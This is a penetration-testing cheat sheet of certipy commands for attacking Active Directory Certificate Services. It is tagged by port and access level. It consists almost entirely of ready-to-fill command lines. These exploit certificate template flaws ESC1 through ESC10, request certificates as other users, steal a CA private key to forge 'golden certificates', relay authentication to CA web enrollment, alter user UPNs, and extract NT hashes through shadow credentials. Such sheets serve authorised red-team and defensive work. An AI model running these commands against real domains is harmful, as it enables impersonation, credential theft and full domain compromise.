# certipy

% adcs, certificate, pki, windows, Active directory, template, shadow credential

## List certificate templates
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

List all certificate templates and looks for ESC vulnerabilities.

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip> 
```

## Request certificate
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user


```bash
certipy req -u <user>@<domain> -p <password> -target <ca-fqdn> -template <template> -ca <certificate-authority>
```

## Authenticate with pfx certificate
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate to the domain with a pfx certificate.

```bash
certipy auth -pfx <pfx-file>
```

## Authenticate through LDAP (Schannel) with pfx certificate
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

Authenticate to the domain with a pfx certificate through LDAP Schannel.

```bash
certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
```

## Golden Certificate - steal CA certificate and private key
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
certipy ca -u <user>@<domain> -p <password> -backup -ca <certificate-authority> -target-ip <ca-ip>
```

##  Golden Certificate - forge certificate
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc-ip>:389
```

## Request certificate for another user - ESC1 - ESC6
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
certipy req -u <user>@<domain> -p <password> -target <ca-fqdn> -template <template> -ca <certificate-authority> -upn <targeted-user>@<domain>
```

## Request certificate on behalf of with Certificate Request Agent certificate - ESC3
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
certipy req -u <user>@<domain> -p <password> -target <ca-fqdn> -template <template> -ca <certificate-authority> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
```

## Modify template in order to make it vulnerable to ESC1 - ESC4
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
certipy template -u <user>@<domain> -p <password> -template <template> -save-old
```

## Issue certificate for specific request id - ESC7
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
certipy ca -u <user>@<domain> -p <password> -ca <certificate-authority> -issue-request <csr-id>
```

## Relay authentication to CA Web Enrollment - ESC8
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

Relay a machine or user authentication to the CA Web Enrollment to exploit ESC8.

```bash
certipy relay -ca <ca-fqdn> -target <ca-ip>
```

## Relay domain controller authentication to CA Web Enrollment - ESC8
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

Relay a domain controller authentication to the CA Web Enrollment to exploit ESC8.

```bash
certipy relay -ca <ca-fqdn> -target <ca-ip> -template 'DomainController'
```

## Modify user upn to another one - ESC9 - ESC10
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

```bash
certipy account update -u <user>@<domain> -p <password> -user <targeted-user> -upn <administrator-user>
```

## Get NT hash - Shadow Credential
#assessment/AD #attack_type/Coerce_Relay #port/445 #port/139 #protocol/smb #access/Domain_user

Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential

```bash
certipy shadow auto -u <user>@<domain> -p <password> -account <targeted-user>
```
